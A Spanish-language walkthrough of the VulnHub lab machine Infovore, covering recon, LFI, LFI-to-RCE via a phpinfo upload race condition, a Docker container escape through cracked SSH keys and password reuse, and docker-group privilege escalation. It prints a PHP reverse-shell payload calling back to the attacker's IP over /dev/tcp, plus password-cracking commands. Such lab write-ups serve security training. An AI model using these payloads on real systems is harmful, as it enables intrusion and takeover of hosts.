-----
- Tags: #infophp #lfi #RCE  #subida-archivos #race-condition #docker-breakout #ssh #ssh2john
-----
# Explicación e instalación

> En este quinto escenario vamos a estar resolviendo la máquina **Infovore**, para descargarla nos vamos a dirigir al siguiente [link](https://www.vulnhub.com/entry/infovore-1,496/). En este caso tendremos que configurar el adaptador de red en modo **Bridged**.

# Resolución

## Reconocimiento

### NMAP

```js
# Nmap 7.94SVN scan initiated Sun Nov  3 10:53:36 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN allPorts 192.168.0.129
Nmap scan report for 192.168.0.129
Host is up, received arp-response (0.0023s latency).
Scanned at 2024-11-03 10:53:36 -03 for 5s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
MAC Address: 00:0C:29:2A:F3:95 (VMware)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Nov  3 10:53:41 2024 -- 1 IP address (1 host up) scanned in 5.56 seconds
```

Servicios

```js
# Nmap 7.94SVN scan initiated Sun Nov  3 10:54:08 2024 as: nmap -sCV -p80 -oN services 192.168.0.129
Nmap scan report for 192.168.0.129
Host is up (0.00093s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Include me ...
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:2A:F3:95 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  3 10:54:15 2024 -- 1 IP address (1 host up) scanned in 6.61 seconds
```

### Información obtenida y acceso

```js
Puerto 80

whatweb:
http://192.168.0.129 [200 OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.0.129], JQuery, PHP[7.4.7], Script, Title[Include me ...], X-Powered-By[PHP/7.4.7]

Directory's (gobuster):

# directory-list-2.3-medium and big

/img/                 (Status: 403)
/icons/               (Status: 403)
/css/                 (Status: 403)
/vendor/              (Status: 403)
/server-status/       (Status: 403)

Extensiones de archivos (gobuster: php,sh,css,js,php.bak,bak)

/index.php
/info.php ---> Mucha información importante ---> PHP 7.4.7 ---> File Upload ON

```

Vamos a intentar conseguir un LFI haciendo fuzzing de un parámetro en la URL de esta forma ``http://192.168.0.129/index.php?FUZZ=/etc/passwd`` ya que hay veces que **existen parámetros vulnerables a LFI**.

 - ``wfuzz --hc=403 --hw=382 -c -t 20 -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.0.129/index.php\?FUZZ=/etc/passwd``

Encontramos un **parámetro vulnerable a LFI** llamado ``filename`` que nos permite listar contenido de la máquina

``http://192.168.0.129/index.php?filename=/etc/passwd``

![[Imagenes de todas las carpetas/Máquina vulnerable 5/MV 1.png]]

Ahora lo que hacemos es **subir un archivo ``php``** al ``info.php`` a través de **Burpsuite** cambiando la petición a ``POST`` y **modificando** y **añadiendo** unas **cabeceras nuevas**.

```js
Content-Type: multipart/form-data; boundary=--pwned
Content-Length: 189

----pwned
Content-Disposition: form-data; name="name"; filename="cmd.php"
Content-Type: text/plain

<?php system("bash -c 'bash -i >& /dev/tcp/192.168.0.194/443 0>&1'"); ?>
----pwned
```

![[Imagenes de todas las carpetas/Máquina vulnerable 5/MV 2.png]]

Si en la respuesta de la petición con las cabeceras anteriores **filtramos** por la cadena ``cmd`` veremos que ahí estará nuestro código y además nos indicará en que ruta de ``/tmp/`` se encuentra, por lo tanto lo único que queda hacer es **conectar el LFI a la ruta brindada**, pero esto **no es tan fácil**, ya que una vez que un archivo temporal se sube, **rápidamente se elimina**, por lo tanto tendremos que jugar con una [[Race Condition]] para que antes de que nuestro archivo malicioso sea eliminado nos lo **interprete y obtengamos nuestra Reverse Shell**.

Para realizar esto nos vamos a apoyar del script brindado por **Hacktricks** --> https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo y lo vamos a modificar para que se nos adecue a nuestro escenario.

Lo ejecutamos mientras nos ponemos en escucha por el *puerto 443* y ganamos acceso a la máquina.

----------
### Escape del contenedor

Si hacemos un ``hostname -I`` veremos que **no coincide la IP** con la de nuestra máquina víctima, esto quiere decir que **estamos en un contenedor** y que debemos escapar de el.

Utilizaremos la herramienta ``linpeas`` de https://roriwa.github.io/pentest/tools/LinPEAS/ para realizar un reconocimiento, simplemente usamos el ``curl`` brindado por la web.
De esta manera descubriremos un archivo oculto en la raíz llamado ``.oldkeys.tgz`` que al descomprimirlo con ``tar -xvf .olfkeys.tgz`` conseguiremos dos archivos, uno con un **clave privada** que se encuentra **cifrada**, y otra con una **clave pública**. Intentaremos **romper la clave privada** copiándola y llevándolo a nuestra máquina de atacante colocándole al archivo el nombre ``id_rsa``, ahí usaremos una herramienta llamada ``ssh2john.py`` ubicada en ``/usr/share/john/ssh2john.py``.

Antes de romper la clave revisaremos el archivo ``/proc/net/tcp`` para ver que puertos están abiertos a simple vista de manera interna en búsqueda del *puerto 22 SSH*.
Si hacemos un ``hostname -I`` vemos que estamos en la ``192.168.150.21`` es fácil de interpretar que la máquina host es la ``192.168.150.1``, esto recordemos que se debe a que **docker asigna por defecto la interfaz de red XXX.XXX.XXX.1** en la máquina **Host** y a partir de ahí se despliegan contenedores en la *XXX.XXX.XXX.2* en la *XXX.XXX.XXX.3* en la *XXX.XXX.XXX.4* y así sucesivamente.
Por lo tanto podemos enviar una cadena vacía al ``/dev/tcp/192.168.150.1/22`` y si el código de estado es ``0``, es decir exitoso, significa que el *puerto 22* está **abierto**.

- ``echo '' > /dev/tcp/192.168.150.1/22``

Descubrimos que el *puerto 22* está **abierto de manera interna**, por lo tanto ahora si procedemos a romper la clave privada que conseguimos previamente para autenticarnos podríamos intentar autenticarnos en la máquina HOST.

El comando ssh2john al pasarle el ``id_rsa`` cifrado nos dará una **HASH**, por lo tanto ese hash lo metemos en otro archivo y ahí usamos el john para obtener su contraseña.

- ``john -w:/usr/share/worldlists.txt/rockyou.txt hash_file``

El resultado es ``choclate93`` por lo tanto intentamos autenticarnos en la máquina host desde el contenedor pero nos da un error.

- ``ssh -i root root@192.168.150.1``

-------

Como lo anterior **no funcionó** intentamos **utilizar esa misma contraseña** para migrar al usuario **root** dentro del contenedor y lo **conseguimos**. Ya siendo usuarios root en el contenedor buscamos una manera de salir de este.

Dentro del directorio ``/root`` encontramos otro **par de claves SSH** y un archivo ``known_hosts`` en el directorio ``.ssh`` oculto. El archivo ``id_rsa.pub`` al verlo nos muestra al final que **admin posee** de alguna manera **confianza para autenticarse sin proporcionar contraseña** en la ``192.168.150.1`` ya que se lo toma como usuario de "*conocido*", por lo tanto intentaremos ingresar a la máquina host a través de dicho usuario.

- ``ssh admin@192.168.150.1``

En la contraseña probaremos colocar ``choclate93`` para ver si funciona y en efecto, es válida. De esta forma ingresamos a la máquina Host **Infovore** ya que se **reutilizó la contraseña**.

------
### Escalada de privilegios

Lo que resta ahora es escalar al usuario root en la máquina Host.

Vemos con ``id`` que ``admin`` está en el grupo ``docker``, por lo tanto podemos aprovecharnos de esto para escalar privilegios.
Realizamos una **montura** de todo el sistema operativo en un contenedor creado por nosotros y dentro de este le otorgamos **privilegios SUID** al binario ``bash``, esto generará gracias a la montura que ese privilegio se otorgue en la máquina Host, por lo tanto **podremos ascender a root**.


